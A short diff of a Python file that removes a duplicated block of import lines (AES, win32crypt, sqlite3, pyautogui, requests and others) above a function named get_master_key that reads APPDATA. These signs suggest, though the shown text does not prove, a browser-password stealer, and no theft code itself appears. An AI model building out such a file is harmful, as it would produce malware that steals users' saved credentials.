@@ -16,24 +16,6 @@ import pyautogui
 from PIL import Image
 import requests
 
-from Crypto.Cipher import AES
-import base64
-import io
-import json
-import os
-import platform
-import shutil
-import socket
-import sqlite3
-import subprocess
-import sys
-import tempfile
-import time
-import win32crypt
-import pyautogui
-from PIL import Image
-import requests
-
 
 def get_master_key():
   appdata = os.getenv("APPDATA")
